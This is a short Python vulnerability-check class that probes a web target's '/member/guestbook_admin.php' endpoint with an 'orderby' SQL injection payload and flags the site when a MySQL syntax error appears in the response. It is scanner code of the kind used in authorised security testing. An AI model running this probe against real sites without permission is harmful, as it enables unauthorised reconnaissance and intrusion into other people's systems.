import requests
from termcolor import cprint

class V5orderby:

    def __init__(self,url):
        self.url = url
    def checksql(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/member/guestbook_admin.php?dopost=getlist&pageno=1&orderby=11"
        if '://' not in self.url:
            self.url = 'http://' + self.url + '/'
        url = self.url
        vulnurl = url + payload
        try:
            r = requests.get(url=vulnurl,headers=headers)
            html = r.text
            if 'in your SQL syntax' in html:
                cprint("target may be V5order by SqlInject","red")
        except:
            return False